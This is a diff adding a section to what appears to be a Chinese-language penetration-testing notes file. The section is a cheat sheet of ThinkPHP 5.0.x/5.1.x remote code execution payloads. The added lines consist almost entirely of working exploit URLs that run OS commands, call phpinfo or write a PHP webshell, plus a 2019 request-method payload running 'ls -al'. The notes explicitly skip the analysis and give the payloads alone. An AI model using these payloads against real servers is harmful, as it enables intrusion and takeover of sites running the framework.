@@ -212,6 +212,57 @@ curl "127.0.0.1//a.php?/cache"
 
 
 
+### Thinkphp5 rce
+&emsp;&emsp;不再分析原理，直接总结payload：
+```url
+TP版本5.0.21：
+http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+
+http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+
+
+TP版本5.0.22：
+http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+
+http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+
+TP5.1.*
+thinkphp5.1.29为例
+
+1、代码执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
+
+2、命令执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=操作系统命令
+
+3、文件写入（写shell）：
+http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
+
+4、未知:
+http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
+
+5、代码执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+
+6、命令执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令
+
+7、代码执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+
+8、命令执行:
+http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令
+```
+
+2019.1.11爆出的漏洞：
+
+```php
+index.php?s\captcha
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al
+```
+
+分析文章来自[这里](<http://www.lmxspace.com/2019/01/13/ThinkPHP-request%E5%87%BD%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/>)
 
 
 
